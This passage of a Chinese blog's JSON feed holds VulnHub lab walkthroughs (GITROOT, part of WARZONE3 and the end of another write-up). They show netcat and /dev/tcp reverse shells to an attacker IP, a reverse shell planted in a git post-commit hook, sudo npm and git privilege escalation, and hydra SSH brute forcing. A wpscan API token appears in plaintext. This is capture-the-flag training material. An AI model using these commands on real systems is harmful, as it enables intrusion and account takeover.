没法中断下来，导致重启靶机才能解决  <code>ping -c 4 192.168.0.168</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1385.png\" width=\"560\" alt=\"Image\">\n<blockquote>\n<p>在 ping 之后，上述 tcpdump 就会抓取到网卡的数据，证明这里的命令最终会被服务器执行，就可以在这里构造 payload 反弹 shell。</p>\n</blockquote>\n<p>反弹 shell，接受会话，美化终端<br>\n <code>nc 192.168.0.168 4444 -e /bin/bash</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1386.png\" width=\"660\" alt=\"Image\">\n<p>收集服务器信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1387.png\" width=\"630\" alt=\"Image\">\n<p>发现服务器有 root、catchme、tornado 三个有 bash 的用户，并且 www-data 可以免密调用 catchme 的 npm 命令执行</p>\n<h3 id=\"sudonpm提权\"><a class=\"markdownIt-Anchor\" href=\"#sudonpm提权\">#</a> sudo (npm) 提权</h3>\n<p>在 GTFobins 上找到了思路，写 payload 进行提权需要两个文件，一个 package.json,<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zaGVsbC1mZzFoeWouc2g=\"> 一个 shell.sh</span>，用 chmod 使其可执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi package.json</span><br><span class=\"line\">&#123; &quot;name&quot;: &quot;shell&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: &#123; &quot;shell&quot;: &quot;./shell.sh&quot; &#125;, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot; &#125;</span><br><span class=\"line\">echo &quot;/bin/bash&quot; &gt;shell.sh</span><br><span class=\"line\">chmod +x shell.sh</span><br><span class=\"line\">sudo -u catchme npm run shell</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1388.png\" width=\"620\" alt=\"Image\">\n<p>或者可以直接浓缩为一句话的 linux 命令，直接提权至 catchme 用户</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /tmp ; echo &#x27; &#123; &quot;name&quot;: &quot;shell&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;:</span><br><span class=\"line\">&quot;index.js&quot;, &quot;scripts&quot;: &#123; &quot;shell&quot;: &quot;./shell.sh&quot; &#125;, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot; &#125;</span><br><span class=\"line\">&#x27; &gt;package.json ; echo &quot;/bin/bash&quot; &gt;shell.sh ;chmod +x shell.sh ; sudo -u catchme</span><br><span class=\"line\">npm run shell</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1389.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"凯撒解密脚本\"><a class=\"markdownIt-Anchor\" href=\"#凯撒解密脚本\">#</a> 凯撒解密脚本</h3>\n<p>在用户目录下找到了一个加密的英文字符串，看到 trrwnqc 之后感觉很像是一个英文字符移位之后的显示，猜测是采用了凯撒加密。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1390.png\" width=\"340\" alt=\"Image\">\n<p>网上找一个可以解密恺撒解密的脚本放在本地</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\">alphabet = string.ascii_lowercase</span><br><span class=\"line\">encrypted = &quot;hcjqnnsotrrwnqc&quot;</span><br><span class=\"line\">enc_len = len(encrypted)</span><br><span class=\"line\">for i in range(25):</span><br><span class=\"line\">\t  plain_text = &quot;&quot;</span><br><span class=\"line\">\tfor c in encrypted:</span><br><span class=\"line\">\t\tif c.islower():</span><br><span class=\"line\">\t\t\tc_unicode = ord(c)</span><br><span class=\"line\">\t\t\tc_index = ord(c) - ord(&quot;a&quot;)</span><br><span class=\"line\">\t\t\tnew_index = (c_index - i) % 26</span><br><span class=\"line\">\t\t\tnew_unicode = new_index + ord(&quot;a&quot;)</span><br><span class=\"line\">\t\t\tnew_character = chr(new_unicode)</span><br><span class=\"line\">\t\t\tplain_text = plain_text + new_character</span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tplain_text += c</span><br><span class=\"line\">\t\t\tprint(f&quot;ID:&#123;i&#125; : &#123;plain_text&#125;&quot;)</span><br></pre></td></tr></table></figure>\n<p>此脚本的作用就是依次计算加密字符串偏移 1 - 26 后的解密值</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1391.png\" width=\"400\" alt=\"Image\">\n<p>运行脚本之后得到了如下字符串，其中最可疑的是 idkrootpussword</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1392.png\" width=\"400\" alt=\"Image\">\n<p>看样子像是 root 的密码，但是试了一下，不能凭借此密码登陆到 root</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1393.png\" width=\"320\" alt=\"Image\">\n<p>既然这个密码不是最终的密码，就写一些变体如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1394.png\" width=\"440\" alt=\"Image\">\n<p>用 hydra 尝试一一破解，最后得到了真实的 root 密码<br>\n <code>hydra -l root -P secret.txt ssh://192.168.0.183 -f -t 64 -I -vV</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1395.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 切换到了 root 用户成功，拿到了 root 权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1396.png\" width=\"330\" alt=\"Image\">\n<h3 id=\"tcpdump抓包命令\"><a class=\"markdownIt-Anchor\" href=\"#tcpdump抓包命令\">#</a> tcpdump 抓包命令</h3>\n<blockquote>\n<p>TCPDump 可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供 and、or、not 等逻辑语句来帮助你去掉无用的信息。他的功能与 wireshark 的功能相同，是命令行版本的抓包工具。</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">按网卡过滤：</span> </span><br><span class=\"line\">sudo tcpdump -i eth0</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-tt ： 在每列倾倒资料上显示未经格式化的时间戳记； sudo tcpdump -i eth0 -tt</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-n ：不把主机的网络地址转换成名字；</span> </span><br><span class=\"line\">sudo tcpdump -i eth0 -n</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-S ：用绝对而非相对数值列出 TCP 关联数；</span> </span><br><span class=\"line\">sudo tcpdump -i eth0 -S</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-vv ：更详细显示指令执行过程；</span> </span><br><span class=\"line\">sudo tcpdump -i eth0 -vv</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-w &lt;数据包文件&gt; ：把数据包数据写入指定的文件：</span> </span><br><span class=\"line\">sudo tcpdump -i eth0 -w output.pcap</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1397.png\" width=\"660\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-r &lt;数据包文件&gt; ：从指定的文件读取数据包数据；</span> </span><br><span class=\"line\">sudo tcpdump -r output.pcap</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1398.png\" width=\"700\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">按主机名过滤：</span> </span><br><span class=\"line\">sudo tcpdump host 110.42.178.227</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">按源地址过滤：</span></span><br><span class=\"line\">sudo tcpdump src 110.42.178.227</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">按目标地址过滤</span></span><br><span class=\"line\">sudo tcpdump dst 110.42.178.227</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">捕获整个网段：</span> </span><br><span class=\"line\">sudo tcpdump net 192.168.0.0/24</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">捕获一个端口：</span> </span><br><span class=\"line\">sudo tcpdump port 22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">捕获端口区间：</span> </span><br><span class=\"line\">sudo tcpdump portrange 21- 2121</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">多个选项与：</span> </span><br><span class=\"line\">sudo tcpdump host 110.42.178.227 and port 21</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">多个选项或：</span> </span><br><span class=\"line\">sudo tcpdump host 110.42.178.227 or port 2 121</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">排除选项：</span> </span><br><span class=\"line\">sudo tcpdump host 110.42.178.227 and not 1.117.52.219</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/148%20GITROOT/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/148%20GITROOT/",
            "title": "VULNHUB 48 GITROOT",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ2l0cm9vdC0xLDQ4OC8=\">https://www.vulnhub.com/entry/gitroot-1,488/</span><br>\n 教程链接地址 1: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2dpdHJvb3QtMS12dWxuaHViLXdhbGt0aHJvdWdoLw==\">https://www.hackingarticles.in/gitroot-1-vulnhub-walkthrough/</span><br>\n 教程链接地址 2: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oMGozbi5tZWRpdW0uY29tL3Z1bG5odWItZ2l0cm9vdC0xLWQxZWE1ZGUzZDEwYQ==\">https://h0j3n.medium.com/vulnhub-gitroot-1-d1ea5de3d10a</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 WARZONE3：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<p>靶机开启之前和开启之后各扫一次，得到靶机 ip 192.168.0.187</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1470.png\" width=\"520\" alt=\"Image\">\n<p>2 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息<br>\n <code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1471.png\" width=\"470\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 http：可对 web 进行渗透测试收集信息<br>\n 11211 memcache：未知端口</p>\n</blockquote>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODcv\">http://192.168.0.187/</span> 进行 http 信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1472.png\" width=\"400\" alt=\"Image\">\n<p>提示我们有一个域名需要检查一下，将这个子域名以及它的上一级域名的 DNS 解析地址进行修改</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1473.png\" width=\"320\" alt=\"Image\">\n<p>再次查看子域名，发现是一个 wordpress 站点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1474.png\" width=\"520\" alt=\"Image\">\n<p>而域名处还是原来的界面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1475.png\" width=\"390\" alt=\"Image\">\n<p>对 wordpress 站点进行扫描扫描，获取其存在的用户名<br>\n <code>wpscan -e u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://wp.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1476.png\" width=\"660\" alt=\"Image\">\n<p>找到一个用户名 beth</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1477.png\" width=\"410\" alt=\"Image\">\n<p>顺便爆破一下这个用户名的密码，但是没有结果</p>\n<p><code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U beth -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://wp.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1478.png\" width=\"660\" alt=\"Image\">\n<p>进行目录扫描，看看有没有敏感的站点</p>\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list- 2.3-medium.txt -u http://wp.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1479.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"子域名扫描\"><a class=\"markdownIt-Anchor\" href=\"#子域名扫描\">#</a> 子域名扫描</h3>\n<p>都点开看了一下发现没有什么敏感的文件，既然这个站下有 wp.gitroot.vuln 这个子域名，会不会有其他的子域名，尝试一波扫描子域名</p>\n<p><code>gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://wp.gitroot.vuln/ -o subdomain.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1480.png\" width=\"660\" alt=\"Image\">\n<p>扫描到了子域名 repo.gitroot.vuln，将其添加到本地 hosts 文件中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1481.png\" width=\"410\" alt=\"Image\">\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovL3JlcG8uZ2l0cm9vdC52dWxuLw==\">http://repo.gitroot.vuln/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1482.png\" width=\"520\" alt=\"Image\">\n<p>提示有 set.php 页面和 get.php 页面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1483.png\" width=\"420\" alt=\"Image\">\n<p>按提示设置个 key 和 value 的值看看</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1484.png\" width=\"420\" alt=\"Image\">\n<p>但是好像没有什么用，get.php 文件显示不出来有价值的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1485.png\" width=\"420\" alt=\"Image\">\n<p>下一步就扫扫目录，看有没有什么新发现</p>\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list- 2.3-medium.txt -u http://repo.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1486.png\" width=\"660\" alt=\"Image\">\n<p>所有的目录都打开看了看，发现没有什么有价值的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1487.png\" width=\"450\" alt=\"Image\">\n<p>换个字典在扫一波，这次用 common.txt 这个字典<br>\n <code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/dirb/wordlists/common.txt -u http://repo.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1488.png\" width=\"620\" alt=\"Image\">\n<p>多得到了一个文件，为 http://repo.gitroot.vuln/.git/HEAD<br>\n 访问之后显示没有权限去查看，但是确定文件是真实存在的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1489.png\" width=\"420\" alt=\"Image\">\n<p>并且可以访问得到这个文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1490.png\" width=\"460\" alt=\"Image\">\n<h3 id=\"git-dumper使用\"><a class=\"markdownIt-Anchor\" href=\"#git-dumper使用\">#</a> git-dumper 使用</h3>\n<p>对于 /.git/HEAD 文件泄漏，可以使用 git-dumper 工具，在 github 上下载</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1494.png\" width=\"370\" alt=\"Image\">\n<p><code>python3 git_dumper.py http://repo.gitroot.vuln/ ./repo_gitroot</code> <br>\n 用此工具将源码给下载到本地的 repo_gitroot 文件夹中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1491.png\" width=\"520\" alt=\"Image\">\n<p>看了看这几个文件，有一个文件显示了几个疑似用户名</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1492.png\" width=\"630\" alt=\"Image\">\n<p>有一个文件提示说去看看其他的 git 仓库</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1493.png\" width=\"540\" alt=\"Image\">\n<h3 id=\"git-切换历史仓库\"><a class=\"markdownIt-Anchor\" href=\"#git-切换历史仓库\">#</a> git 切换历史仓库</h3>\n<p>一个一个的 git show，在一个仓库中找到了如下的代码<br>\n <code>git show ce3843e497dd28f992250d36ee1b4e8c9e0f18e9</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1495.png\" width=\"530\" alt=\"Image\">\n<p>或者用 git reset --hard 来切换 git 的仓库信息<br>\n <code>git reset --hard b069fdde4cf12980175c3fbd79316fe42b57e19a</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1496.png\" width=\"530\" alt=\"Image\">\n<p>-&gt; 得到了一组用户和密码 pablo：ihjedpvqfe</p>\n<p>但是这个用户和密码是来不到这台服务器的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1497.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 ssh</h3>\n<p>看来只有自己设置用户名字典来爆破了，先尝试自己输入一些在收集信息过程中看到的疑似密码的字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1498.png\" width=\"440\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用自定义的密码爆破没有结果，就用rockyou.txt字典来爆破</span></span><br><span class=\"line\">hydra -L user.txt -P passwd.txt ssh://192.168.0.187 -f -t 64 -I -vV</span><br><span class=\"line\">hydra -L user.txt -P rockyou.txt ssh://192.168.0.187 -f -t 64 -I -vV</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1499.png\" width=\"660\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1500.png\" width=\"660\" alt=\"Image\">\n<p>需要爆破很长时间才能爆破出来，目前还没有找到更快的爆破的方法</p>\n<h3 id=\"sshpass-连接靶机\"><a class=\"markdownIt-Anchor\" href=\"#sshpass-连接靶机\">#</a> sshpass 连接靶机</h3>\n<p>第一次登陆点击确认连接，之后就可以用 sshpass 来登陆<br>\n sshpass -p mastergitar ssh <span class=\"exturl\" data-url=\"bWFpbHRvOnBhYmxvQDE5Mi4xNjguMC4xODc=\">pablo@192.168.0.187</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1501.png\" width=\"470\" alt=\"Image\">\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<p>之前在 git 不同的版本上找过过一个密码，看一看服务器有哪些用户，试试之前哪个密码是不是这几个用户的密码，依次尝试 jen beth root，发现 ihjedpvqfe 不是个密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1502.png\" width=\"340\" alt=\"Image\">\n<p>用户文件下提示需要检查一个新的 git 仓库</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1503.png\" width=\"370\" alt=\"Image\">\n<p>既然有新的 git 仓库，肯定有个.git 文件，直接 find 全局搜索</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1504.png\" width=\"560\" alt=\"Image\">\n<p>进到这个文件夹下，依次使用 git show 查看不同的本地仓库的改变</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1505.png\" width=\"480\" alt=\"Image\">\n<p>没有什么新发现，在看看这个文件夹下有没有什么敏感文件</p>\n<p>居然发现了一个非常奇怪的文件，有这么多前缀相同的，肯定有什么问题</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1506.png\" width=\"620\" alt=\"Image\">\n<p>排序查看有什么情况  <code>ls -Alh | sort -k4 | tail -n5</code> <br>\n 看到 dev-43 与众不同，查看其内容之后有一些 git 的提交信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1507.png\" width=\"660\" alt=\"Image\">\n<p>查看到第三条日志中是增加了一些信息，用 git show 查看一下增加的信息<br>\n <code>git show 06fbefc1da56b8d552cfa299924097ba1213dd93</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1508.png\" width=\"660\" alt=\"Image\">\n<p>得到了一个密码，用这个密码成功拿到了 beth 用户的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1509.png\" width=\"440\" alt=\"Image\">\n<p>在用户目录下看到了一个提示文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1510.png\" width=\"230\" alt=\"Image\">\n<p>只需要将 zip 文件放在～jen/public/repos/ 下，就会将它自动解压到 jen 仓库，看来是 jen 用户的一个定期执行任务的脚本</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1511.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"linux使用7z\"><a class=\"markdownIt-Anchor\" href=\"#linux使用7z\">#</a> linux 使用 7z</h3>\n<p>测试了一下，服务器上没有 unzip 命令，但是有 7z 命令，构造下列 Linux 命令<br>\n cd /tmp;git init;echo -e ‘#!/bin/bash \\nbash -i &gt;&amp; /dev/tcp/192.168.0.168/4444 0&gt;&amp;1’ &gt; /tmp/.git/hooks/post-commit;chmod 777 /tmp/.git/hooks/post-commit;7z a /tmp/shell.zip/tmp/.git;cp /tmp/shell.zip/home/jen/public/repos/</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1512.png\" width=\"660\" alt=\"Image\">\n<p>这个复合的 linux 命令的作用就是将反弹 shell 的脚本打印到一个新的 git 仓库的 hooks/post-commit 中，并且赋予可执行权限，在用 7z 进行压缩为 zip，最后在将其复制到 jen 用户下的 repos 中。</p>\n<p>监听 shell 等待 jen 用户的 shell 反弹出来，接收到之后标准化 tty</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1513.png\" width=\"520\" alt=\"Image\">\n<p>到处看一看文件，都翻阅一下看看有敏感信息没有</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1514.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"viminfo信息泄漏\"><a class=\"markdownIt-Anchor\" href=\"#viminfo信息泄漏\">#</a> .viminfo 信息泄漏</h3>\n<p>发现 viminfo 中有一个 binzpbeocnexoe，可能是个密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1515.png\" width=\"460\" alt=\"Image\">\n<p>su root 尝试了一下，是失败的，它不是 root 的密码，继续试一下，发现它就是用户 jen 的密</p>\n<h3 id=\"sudogit提权\"><a class=\"markdownIt-Anchor\" href=\"#sudogit提权\">#</a> sudo (git) 提权</h3>\n<p>这样子就可以用来看 jen 的权限设置，看是否有什么问题，找到了 jen 用户可以直接调用 root 的 git 命令执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1516.png\" width=\"660\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在gtfobins上找到了提权方法</span></span><br><span class=\"line\">sudo git help config</span><br><span class=\"line\">!/bin/bash</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1517.png\" width=\"310\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 的 shell</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/147%20WARZONE3/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/147%20WARZONE3/",
            "title": "VULNHUB 47 WARZONE3",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2Fyem9uZS0zLWV4b2dlbiw2MDYv\">https://www.vulnhub.com/entry/warzone-3-exogen,606/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 WARZONE3：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<p>开靶机前后各扫描一次，得到靶机 ip 192.168.0.186</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1432.png\" width=\"520\" alt=\"Image\">\n<p>2 ）扫描靶机上开放的端口及详细信息<br>\n <code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1433.png\" width=\"440\" alt=\"Image\">\n<blockquote>\n<p>nmap 参数说明<br>\n - sV 表示扫描服务及版本信息<br>\n - sC 表示以默认的脚本进行扫描<br>\n - T4 表示控制扫描的速度<br>\n - Pn 表示不用 ping 去扫描机器<br>\n–open 表示只扫描开放的端口<br>\n - p- 表示扫描所有的端口<br>\n–min-rate 设置最小的扫描速度</p>\n</blockquote>\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n21 ftp：可尝试进行匿名登陆下载文件<br>\n 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 4444 krb 524 ：未知端口</p>\n</blockquote>\n<h3 